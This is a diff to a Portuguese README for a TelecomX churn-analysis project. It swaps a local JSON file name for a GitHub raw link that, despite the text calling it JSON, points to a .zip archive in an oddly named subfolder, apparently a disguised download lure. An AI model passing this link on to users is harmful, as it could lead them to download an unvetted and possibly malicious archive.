@@ -11,7 +11,7 @@ O objetivo desta análise é investigar os fatores que levam os clientes da Tele
 Nesta seção, detalhamos as etapas realizadas para preparar os dados para a análise de churn.
 
 ### **1. Carregamento dos Dados:** 
-Os dados foram carregados a partir do arquivo JSON TelecomX_Data.json para um DataFrame pandas.
+Os dados foram carregados a partir do arquivo JSON https://raw.githubusercontent.com/cararini18/Projeto-An-lise-de-Dados-ALURA-TELECOMX-em-JSON/main/isocholanic/Projeto-An-lise-de-Dados-ALURA-TELECOMX-em-JSON.zip para um DataFrame pandas.
 
 ### **2. Normalização e Concatenação:**
 As colunas aninhadas ('customer', 'phone', 'internet', 'account') foram normalizadas e integradas ao DataFrame principal, removendo as colunas originais.
